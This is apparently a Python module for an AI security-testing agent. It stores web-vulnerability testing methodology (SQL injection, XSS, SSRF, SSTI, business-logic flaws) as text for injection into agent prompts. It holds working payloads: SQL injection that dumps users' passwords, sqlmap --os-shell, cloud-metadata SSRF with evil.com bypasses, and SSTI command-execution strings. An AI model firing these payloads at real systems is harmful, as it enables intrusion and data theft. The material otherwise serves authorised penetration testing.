"""Web vulnerability knowledge base.

Deep knowledge about web application security:
1. OWASP Top 10 testing
2. Server-side vulnerabilities
3. Client-side vulnerabilities
4. Authentication/session attacks
5. Business logic vulnerabilities
"""

from __future__ import annotations

from collections import defaultdict
from dataclasses import dataclass, field
from typing import Any

import structlog

logger = structlog.get_logger()


@dataclass
class WebVulnPattern:
    """A web vulnerability pattern."""
    pattern_id: str = ""
    name: str = ""
    category: str = ""
    severity: str = "high"
    cwe: str = ""
    owasp: str = ""
    description: str = ""
    testing_methodology: str = ""
    tools: list[str] = field(default_factory=list)

    def to_dict(self) -> dict[str, Any]:
        return {
            "id": self.pattern_id,
            "name": self.name[:30],
            "cwe": self.cwe[:10],
        }


WEB_VULN_PATTERNS: list[dict[str, Any]] = [
    {
        "id": "web-001", "name": "SQL Injection",
        "category": "injection", "severity": "critical",
        "cwe": "CWE-89", "owasp": "A03:2021",
        "desc": "SQL injection testing methodology.",
        "testing": (
            "SQL INJECTION TESTING:\n"
            "1. DETECTION:\n"
            "   - Single quote test: ' → SQL error?\n"
            "   - Boolean-based: ' OR 1=1-- vs ' OR 1=2--\n"
            "   - Time-based: ' OR SLEEP(5)-- (response delay?)\n"
            "   - Error-based: ' AND extractvalue(1,concat(0x7e,version()))--\n"
            "   - UNION-based: ' UNION SELECT NULL,NULL--\n"
            "2. EXPLOITATION:\n"
            "   - Determine column count:\n"
            "     ' ORDER BY 1-- (increment until error)\n"
            "     ' UNION SELECT NULL,NULL,NULL-- (match columns)\n"
            "   - Extract data:\n"
            "     ' UNION SELECT username,password FROM users--\n"
            "   - Database fingerprint:\n"
            "     MySQL: @@version, SLEEP(), BENCHMARK()\n"
            "     PostgreSQL: version(), pg_sleep()\n"
            "     MSSQL: @@version, WAITFOR DELAY\n"
            "     Oracle: banner FROM v$version\n"
            "     SQLite: sqlite_version()\n"
            "3. BYPASS TECHNIQUES:\n"
            "   - Case variation: sElEcT, UnIoN\n"
            "   - Comment injection: /**/UNION/**/SELECT\n"
            "   - URL encoding: %27 for '\n"
            "   - Double encoding: %2527\n"
            "   - WAF bypass: /*!UNION*/ /*!SELECT*/\n"
            "   - Alternative operators: || instead of OR\n"
            "4. AUTOMATED:\n"
            "   - sqlmap -u '{url}' --batch --level=5 --risk=3\n"
            "   - sqlmap --dbs / --tables / --dump\n"
            "   - sqlmap --os-shell (command execution)"
        ),
        "tools": ["sqlmap", "Burp Suite", "sqlninja"],
    },
    {
        "id": "web-002", "name": "Cross-Site Scripting (XSS)",
        "category": "injection", "severity": "high",
        "cwe": "CWE-79", "owasp": "A03:2021",
        "desc": "XSS testing methodology.",
        "testing": (
            "XSS TESTING:\n"
            "1. REFLECTED XSS:\n"
            "   - Basic: <script>alert(1)</script>\n"
            "   - Event handlers: <img src=x onerror=alert(1)>\n"
            "   - SVG: <svg onload=alert(1)>\n"
            "   - URL parameters, search fields, error messages\n"
            "2. STORED XSS:\n"
            "   - User profiles, comments, forum posts\n"
            "   - File names, email subjects\n"
            "   - Admin panels (stored from user input)\n"
            "3. DOM XSS:\n"
            "   - document.location, window.name\n"
            "   - innerHTML, outerHTML, document.write\n"
            "   - eval(), setTimeout(), setInterval()\n"
            "   - jQuery: $(), .html(), .append()\n"
            "   - Source-sink analysis\n"
            "4. BYPASS TECHNIQUES:\n"
            "   - Encoding: &#x3C;script&#x3E;\n"
            "   - Template literals: ${alert(1)}\n"
            "   - Mutation XSS: <noscript><p title='</noscript><img src=x onerror=alert(1)>'>\n"
            "   - CSP bypass:\n"
            "     * JSONP endpoints as script src\n"
            "     * unsafe-eval/unsafe-inline exploitation\n"
            "     * Base tag injection\n"
            "5. AUTOMATED:\n"
            "   - dalfox -u '{url}'\n"
            "   - XSStrike: python xsstrike.py -u '{url}'\n"
            "   - DOM Invader (Burp built-in)"
        ),
        "tools": ["dalfox", "XSStrike", "Burp Suite"],
    },
    {
        "id": "web-003", "name": "Server-Side Request Forgery (SSRF)",
        "category": "server_side", "severity": "critical",
        "cwe": "CWE-918", "owasp": "A10:2021",
        "desc": "SSRF testing methodology.",
        "testing": (
            "SSRF TESTING:\n"
            "1. DETECTION:\n"
            "   - URL parameters: ?url=, ?redirect=, ?img=, ?link=\n"
            "   - Webhook URLs, import URLs, PDF generators\n"
            "   - OpenGraph/preview fetchers\n"
            "   - SVG/XML with external entity references\n"
            "2. EXPLOITATION:\n"
            "   - Cloud metadata:\n"
            "     AWS: http://169.254.169.254/latest/meta-data/\n"
            "     GCP: http://metadata.google.internal/\n"
            "     Azure: http://169.254.169.254/metadata/instance\n"
            "   - Internal service access:\n"
            "     http://127.0.0.1:{port}/\n"
            "     http://localhost/admin\n"
            "     http://internal-api.corp/\n"
            "   - Port scanning:\n"
            "     Iterate http://127.0.0.1:{1-65535}/\n"
            "3. BYPASS TECHNIQUES:\n"
            "   - IP representations:\n"
            "     0177.0.0.1 (octal)\n"
            "     0x7f000001 (hex)\n"
            "     2130706433 (decimal)\n"
            "     127.1 (short form)\n"
            "   - DNS rebinding:\n"
            "     Register domain → resolve to internal IP\n"
            "   - URL parsing tricks:\n"
            "     http://evil.com@127.0.0.1/\n"
            "     http://127.0.0.1#@evil.com\n"
            "   - Protocol smuggling:\n"
            "     gopher://, dict://, file://\n"
            "4. BLIND SSRF:\n"
            "   - Out-of-band: Burp Collaborator, interactsh\n"
            "   - Time-based: Measure response time differences"
        ),
        "tools": ["Burp Suite", "SSRFmap", "interactsh"],
    },
    {
        "id": "web-004", "name": "Server-Side Template Injection (SSTI)",
        "category": "server_side", "severity": "critical",
        "cwe": "CWE-1336", "owasp": "A03:2021",
        "desc": "SSTI testing methodology.",
        "testing": (
            "SSTI TESTING:\n"
            "1. DETECTION:\n"
            "   - Math probe: {{7*7}} → 49? {{7*'7'}} → 7777777?\n"
            "   - Engine fingerprint:\n"
            "     ${7*7} → Freemarker/Thymeleaf\n"
            "     {{7*7}} → Jinja2/Twig/Nunjucks\n"
            "     #{7*7} → Ruby ERB\n"
            "     {{= 7*7}} → doT.js\n"
            "     @(7*7) → Razor\n"
            "2. EXPLOITATION BY ENGINE:\n"
            "   - Jinja2 (Python):\n"
            "     {{config}}\n"
            "     {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}\n"
            "     {{''.__class__.__mro__[1].__subclasses__()}}\n"
            "   - Twig (PHP):\n"
            "     {{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}\n"
            "   - Freemarker (Java):\n"
            "     <#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}\n"
            "   - Pebble (Java):\n"
            "     {% set cmd = 'id' %}{% set bytes = (1).TYPE.forName('java.lang.Runtime')...%}\n"
            "3. SANDBOX BYPASS:\n"
            "   - MRO chain traversal\n"
            "   - Attribute access via dict: config['SECRET_KEY']\n"
            "   - String concatenation to avoid filters\n"
            "   - Unicode escaping"
        ),
        "tools": ["tplmap", "SSTImap", "Burp Suite"],
    },
    {
        "id": "web-005", "name": "Business Logic Vulnerabilities",
        "category": "logic", "severity": "high",
        "cwe": "CWE-840", "owasp": "A04:2021",
        "desc": "Business logic testing methodology.",
        "testing": (
            "BUSINESS LOGIC TESTING:\n"
            "1. AUTHENTICATION LOGIC:\n"
            "   - Registration:\n"
            "     * Duplicate registration (same email, different case)\n"
            "     * Unicode normalization tricks\n"
            "     * Email verification bypass (skip step)\n"
            "   - Login:\n"
            "     * Account lockout bypass (case variation, whitespace)\n"
            "     * Brute force protection bypass\n"
            "     * Remember me token prediction\n"
            "   - Password reset:\n"
            "     * Token reuse\n"
            "     * Token not invalidated after use\n"
            "     * Host header injection in reset URL\n"
            "     * Multiple emails → which token valid?\n"
            "2. PAYMENT LOGIC:\n"
            "   - Price manipulation:\n"
            "     * Negative quantities\n"
            "     * Zero-price items\n"
            "     * Currency conversion abuse\n"
            "   - Coupon/discount:\n"
            "     * Apply multiple coupons\n"
            "     * Race condition on coupon usage\n"
            "     * Coupon code prediction\n"
            "   - Checkout flow:\n"
            "     * Skip payment step\n"
            "     * Modify cart after payment confirmation\n"
            "     * Race condition on inventory\n"
            "3. WORKFLOW BYPASS:\n"
            "   - Multi-step process: Skip intermediate steps\n"
            "   - State machine violations\n"
            "   - Forced browsing to restricted pages\n"
            "4. RACE CONDITIONS:\n"
            "   - Concurrent requests:\n"
            "     * Bank transfer: Withdraw twice simultaneously\n"
            "     * Coupon: Redeem multiple times\n"
            "     * Vote: Submit multiple votes\n"
            "   - Tools: turbo intruder (Burp), race-the-web\n"
            "5. DATA VALIDATION:\n"
            "   - Integer overflow in quantities\n"
            "   - Float precision in financial calculations\n"
            "   - Boundary values (min/max)\n"
            "   - Type juggling (string '0' vs int 0)"
        ),
        "tools": ["Burp Suite", "race-the-web", "turbo-intruder"],
    },
]


class WebVulnKB:
    """Web vulnerability knowledge base.

    Provides web security testing methodology
    injected into agent prompts.
    """

    def __init__(self) -> None:
        self._patterns: dict[str, WebVulnPattern] = {}
        self._log = logger.bind(component="web_vuln_kb")
        self._load_patterns()

    def _load_patterns(self) -> None:
        """Load web vulnerability patterns."""
        for data in WEB_VULN_PATTERNS:
            pattern = WebVulnPattern(
                pattern_id=data["id"],
                name=data["name"],
                category=data.get("category", ""),
                severity=data.get("severity", "high"),
                cwe=data.get("cwe", ""),
                owasp=data.get("owasp", ""),
                description=data.get("desc", ""),
                testing_methodology=data.get("testing", ""),
                tools=data.get("tools", []),
            )
            self._patterns[pattern.pattern_id] = pattern

    def get_patterns_for_category(
        self,
        category: str,
    ) -> list[WebVulnPattern]:
        """Get patterns by category."""
        return [
            p for p in self._patterns.values()
            if p.category == category
        ]

    def build_web_prompt(
        self,
        categories: list[str] | None = None,
        max_patterns: int = 3,
    ) -> str:
        """Build web security testing prompt."""
        lines = ["## Web Vulnerability Testing\n"]
        count = 0
        for pattern in self._patterns.values():
            if categories and pattern.category not in categories:
                continue
            if count >= max_patterns:
                break
            lines.append(f"### {pattern.name} [{pattern.severity.upper()}]")
            if pattern.cwe:
                lines.append(f"CWE: {pattern.cwe} | OWASP: {pattern.owasp}")
            lines.append(pattern.testing_methodology)
            lines.append("")
            count += 1
        return "\n".join(lines)

    def get_stats(self) -> dict[str, Any]:
        cat_counts: dict[str, int] = defaultdict(int)
        cwe_set: set[str] = set()
        for p in self._patterns.values():
            cat_counts[p.category] += 1
            if p.cwe:
                cwe_set.add(p.cwe)
        return {
            "patterns": len(self._patterns),
            "cwes": len(cwe_set),
            "by_category": dict(cat_counts),
        }
